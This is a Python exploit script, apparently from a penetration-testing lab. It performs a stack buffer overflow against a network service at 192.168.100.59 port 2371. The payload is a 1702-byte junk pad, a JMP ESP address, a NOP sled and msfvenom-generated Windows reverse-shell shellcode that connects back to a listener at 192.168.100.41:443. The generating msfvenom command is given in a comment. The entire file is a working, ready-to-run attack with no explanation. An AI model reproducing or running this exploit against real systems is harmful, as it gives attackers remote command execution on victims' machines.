
#!/usr/bin/python3
from pwn import log, socket

offset = 1702
junk = b"A" * offset
jmpesp = b"\xb8\x12\x50\x62"
nops = b"\x90" * 16

#❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.41 LPORT=443 EXITFUNC=thread -a x86 -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f python -v shellcode
shellcode =  b""
shellcode += b"\x33\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b"
shellcode += b"\x81\x73\x13\x64\xda\x84\x9c\x83\xeb\xfc\xe2"
shellcode += b"\xf4\x98\x32\x06\x9c\x64\xda\xe4\x15\x81\xeb"
shellcode += b"\x44\xf8\xef\x8a\xb4\x17\x36\xd6\x0f\xce\x70"
shellcode += b"\x51\xf6\xb4\x6b\x6d\xce\xba\x55\x25\x28\xa0"
shellcode += b"\x05\xa6\x86\xb0\x44\x1b\x4b\x91\x65\x1d\x66"
shellcode += b"\x6e\x36\x8d\x0f\xce\x74\x51\xce\xa0\xef\x96"
shellcode += b"\x95\xe4\x87\x92\x85\x4d\x35\x51\xdd\xbc\x65"
shellcode += b"\x09\x0f\xd5\x7c\x39\xbe\xd5\xef\xee\x0f\x9d"
shellcode += b"\xb2\xeb\x7b\x30\xa5\x15\x89\x9d\xa3\xe2\x64"
shellcode += b"\xe9\x92\xd9\xf9\x64\x5f\xa7\xa0\xe9\x80\x82"
shellcode += b"\x0f\xc4\x40\xdb\x57\xfa\xef\xd6\xcf\x17\x3c"
shellcode += b"\xc6\x85\x4f\xef\xde\x0f\x9d\xb4\x53\xc0\xb8"
shellcode += b"\x40\x81\xdf\xfd\x3d\x80\xd5\x63\x84\x85\xdb"
shellcode += b"\xc6\xef\xc8\x6f\x11\x39\xb2\xb7\xae\x64\xda"
shellcode += b"\xec\xeb\x17\xe8\xdb\xc8\x0c\x96\xf3\xba\x63"
shellcode += b"\x25\x51\x24\xf4\xdb\x84\x9c\x4d\x1e\xd0\xcc"
shellcode += b"\x0c\xf3\x04\xf7\x64\x25\x51\xcc\x34\x8a\xd4"
shellcode += b"\xdc\x34\x9a\xd4\xf4\x8e\xd5\x5b\x7c\x9b\x0f"
shellcode += b"\x13\xf6\x61\xb2\x44\x34\xa5\x5a\xec\x9e\x64"
shellcode += b"\xdb\x3f\x15\x82\xb0\x94\xca\x33\xb2\x1d\x39"
shellcode += b"\x10\xbb\x7b\x49\xe1\x1a\xf0\x90\x9b\x94\x8c"
shellcode += b"\xe9\x88\xb2\x74\x29\xc6\x8c\x7b\x49\x0c\xb9"
shellcode += b"\xe9\xf8\x64\x53\x67\xcb\x33\x8d\xb5\x6a\x0e"
shellcode += b"\xc8\xdd\xca\x86\x27\xe2\x5b\x20\xfe\xb8\x9d"
shellcode += b"\x65\x57\xc0\xb8\x74\x1c\x84\xd8\x30\x8a\xd2"
shellcode += b"\xca\x32\x9c\xd2\xd2\x32\x8c\xd7\xca\x0c\xa3"
shellcode += b"\x48\xa3\xe2\x25\x51\x15\x84\x94\xd2\xda\x9b"
shellcode += b"\xea\xec\x94\xe3\xc7\xe4\x63\xb1\x61\x64\x81"
shellcode += b"\x4e\xd0\xec\x3a\xf1\x67\x19\x63\xb1\xe6\x82"
shellcode += b"\xe0\x6e\x5a\x7f\x7c\x11\xdf\x3f\xdb\x77\xa8"
shellcode += b"\xeb\xf6\x64\x89\x7b\x49"

log.info("Enviando shellcode")

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = shell.connect(("192.168.100.59", 2371))

shell.send(junk + jmpesp + nops + shellcode + b"\n\r")

data = shell.recv(1024)
shell.close()

log.success("Revisa tu listener")
